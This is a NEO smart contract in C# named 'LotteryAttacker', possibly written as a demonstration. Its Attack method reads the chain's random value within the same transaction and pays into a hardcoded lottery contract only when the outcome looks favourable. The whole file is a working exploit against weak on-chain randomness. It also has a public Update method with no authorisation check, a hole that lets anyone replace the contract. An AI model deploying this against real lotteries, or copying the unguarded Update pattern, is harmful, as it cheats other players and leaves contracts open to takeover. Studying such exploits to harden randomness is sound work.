using System;
using System.ComponentModel;
using System.Numerics;
using Neo;
using Neo.SmartContract;
using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Attributes;
using Neo.SmartContract.Framework.Native;
using Neo.SmartContract.Framework.Services;

namespace Lottery
{
    [DisplayName("LotteryAttacker")]
    [ManifestExtra("Author", "NEO")]
    [ManifestExtra("Email", "developer@neo.org")]
    [ManifestExtra("Description", "This is a LotteryAttacker")]
    public class LotteryAttacker : SmartContract
    {

        [InitialValue("NQpRgzN6TVoJ7MMTVsHzvvrfidgjtJNEdo", ContractParameterType.Hash160)]
        private static readonly UInt160 Lottery = default;

        [DisplayName("Entry")]
        public static event EntryEvent onEntry;
        public delegate void EntryEvent(UInt160 entry);
        
        public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
        {
        }
        public static int Attack() {
            onEntry(Runtime.EntryScriptHash);
            onEntry(Runtime.CallingScriptHash);

            BigInteger rand = Runtime.GetRandom();
            for (int i = 0; i < 10; i++) {
                byte[] nextrand = murmur128(rand.ToByteArray(), Runtime.GetNetwork());
                if ((new BigInteger(nextrand)) % 2 == 1) {
                    ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null));
                    return i;
                }
                rand = Runtime.GetRandom();
            }
            return 0;
        }
        public static void Update(ByteString nefFile, string manifest)
        {
            ContractManagement.Update(nefFile, manifest, null);
        }
        public static byte[] murmur128(byte[] nonceData, uint seed) {
            // ExecutionEngine.Assert(nonceData.Length == 16, "invalid nonce length");
            return Murmur128.HashCore(nonceData, seed);
        }

        public static bool check(byte[] nonceData, uint seed) {
            return nonceData.Length == 16;
        }
    }
}
